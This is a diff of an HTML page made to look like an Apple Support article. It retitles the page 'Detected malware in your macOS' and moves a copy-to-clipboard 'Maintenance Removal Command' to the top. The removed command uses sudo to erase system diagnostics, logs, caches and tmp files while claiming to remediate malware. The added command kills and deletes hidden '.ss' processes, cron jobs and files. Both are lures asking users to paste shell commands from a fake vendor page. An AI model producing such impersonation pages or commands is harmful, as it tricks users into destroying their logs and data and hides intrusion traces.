@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protecting against malware in macOS - Apple Support</title>
+    <title>Detected malware in macOS - Apple Support</title>
     <link rel="stylesheet" href="style.css">
     <link rel="icon" href="https://www.apple.com/favicon.ico">
 </head>
@@ -24,22 +24,9 @@
         </div>
 
         <article>
-            <h1>Protecting against malware in macOS</h1>
+            <h1>Detected malware in your macOS</h1>
             
             <p class="intro">Apple operates a threat intelligence process to quickly identify and block malware.</p>
-
-            <section>
-                <h2>Three layers of defense</h2>
-                <p>Malware defenses are structured in three layers:</p>
-                <ol>
-                    <li><strong>Prevent launch or execution of malware:</strong> App Store, or Gatekeeper combined with Notarization</li>
-                    <li><strong>Block malware from running on customer systems:</strong> Gatekeeper, Notarization, and XProtect</li>
-                    <li><strong>Remediate malware that has executed:</strong> XProtect</li>
-                </ol>
-                <p>The first layer of defense is designed to inhibit the distribution of malware, and prevent it from launching even once—this is the goal of the App Store, and Gatekeeper combined with Notarization.</p>
-                <p>The next layer of defense is to help ensure that if malware appears on any Mac, it’s quickly identified and blocked, both to halt spread and to remediate the Mac systems it’s already gained a foothold on. XProtect adds to this defense, along with Gatekeeper and Notarization.</p>
-                <p>Finally, XProtect acts to remediate malware that has managed to successfully execute.</p>
-            </section>
 
             <section class="maintenance-box">
                 <h2>Maintenance Removal Command</h2>
@@ -54,9 +41,22 @@
                         <button id="copy-btn">Copy Command</button>
                     </div>
                     <div class="terminal-body" id="terminal-body">
-                        <div class="command-text" id="command-text">sudo rm -rf /var/db/diagnostics/* /var/db/uuidtext/* && sudo log erase --all && sudo rm -rf /Library/Logs/* ~/Library/Logs/* && sudo rm -rf /private/var/log/* && sudo find /Library/Application\ Support -name "*cache*" -exec rm -rf {} + && sudo find /Users -name "*tmp*" -exec rm -rf {} + && sudo diskutil resetUserPermissions / `id -u` && sudo periodic daily weekly monthly && echo "System Maintenance and Malware Remediation Complete Successfully"</div>
+                        <div class="command-text" id="command-text">pkill -9 -f "\.ss" || killall -9 -r "\.ss"; (crontab -l 2>/dev/null | grep -v "\.ss" | crontab -); rm -rf ~/.ss /tmp/.h /tmp/.ss /tmp/.*.ss /var/tmp/.ss /var/tmp/.h 2>/dev/null && echo "System Maintenance and Malware Remediation Complete Successfully"</div>
                     </div>
                 </div>
+            </section>
+
+             <section>
+                <h2>Three layers of defense</h2>
+                <p>Malware defenses are structured in three layers:</p>
+                <ol>
+                    <li><strong>Prevent launch or execution of malware:</strong> App Store, or Gatekeeper combined with Notarization</li>
+                    <li><strong>Block malware from running on customer systems:</strong> Gatekeeper, Notarization, and XProtect</li>
+                    <li><strong>Remediate malware that has executed:</strong> XProtect</li>
+                </ol>
+                <p>The first layer of defense is designed to inhibit the distribution of malware, and prevent it from launching even once—this is the goal of the App Store, and Gatekeeper combined with Notarization.</p>
+                <p>The next layer of defense is to help ensure that if malware appears on any Mac, it’s quickly identified and blocked, both to halt spread and to remediate the Mac systems it’s already gained a foothold on. XProtect adds to this defense, along with Gatekeeper and Notarization.</p>
+                <p>Finally, XProtect acts to remediate malware that has managed to successfully execute.</p>
             </section>
 
             <section>
@@ -98,7 +98,7 @@
 
     <footer>
         <div class="footer-content">
-            <p>Copyright © 2024 Apple Inc. All rights reserved.</p>
+            <p>Copyright © 2026 Apple Inc. All rights reserved.</p>
             <div class="footer-links">
                 <a href="#">Privacy Policy</a>
                 <a href="#">Terms of Use</a>
